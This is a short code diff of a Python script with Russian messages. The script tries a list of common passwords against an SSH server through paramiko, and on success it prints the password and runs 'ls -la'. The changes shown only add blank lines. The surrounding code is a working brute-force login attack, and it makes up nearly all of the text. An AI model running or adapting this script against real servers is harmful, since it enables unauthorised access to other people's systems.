@@ -17,6 +17,7 @@ common_passwords = [
 for password in common_passwords:
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
     try:
         print(f"Пробуем пароль: {password}")
         client.connect(
@@ -28,10 +29,13 @@ for password in common_passwords:
             allow_agent=False,
             look_for_keys=False
         )
+
         print(f"Успешный вход! Пароль: {password}")
         stdin, stdout, stderr = client.exec_command("ls -la")
+
         print("Результат:")
         print(stdout.read().decode())
+
         print("Ошибки:")
         print(stderr.read().decode())
         break
